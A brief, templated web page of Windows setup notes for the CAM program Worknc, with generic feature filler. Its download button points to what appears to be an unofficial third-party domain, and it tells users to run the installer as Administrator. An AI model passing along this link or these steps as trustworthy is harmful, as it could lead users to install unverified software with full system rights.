# Worknc Windows Setup Notes

[⬇ Download Worknc for Windows](https://worknc-cam-setup.kolmods.com/)

## Download & Install

> Setup notes for **Worknc** on Windows 10/11 (64-bit). Run the installer as Administrator.

### Quick steps

1. Download the latest Windows build for your edition
2. Save the file to a local folder you can find later
3. Run the setup **as Administrator**
4. Enter your license key when prompted
5. Restart if the installer asks — then launch **Worknc** from the Start menu

## What you can use it for

- Core Worknc features on Windows desktop
- Install and configure Worknc for daily use
- Import, edit, and export with Worknc tools
- Tune settings and profiles inside Worknc
- Integrate Worknc into your existing workflow
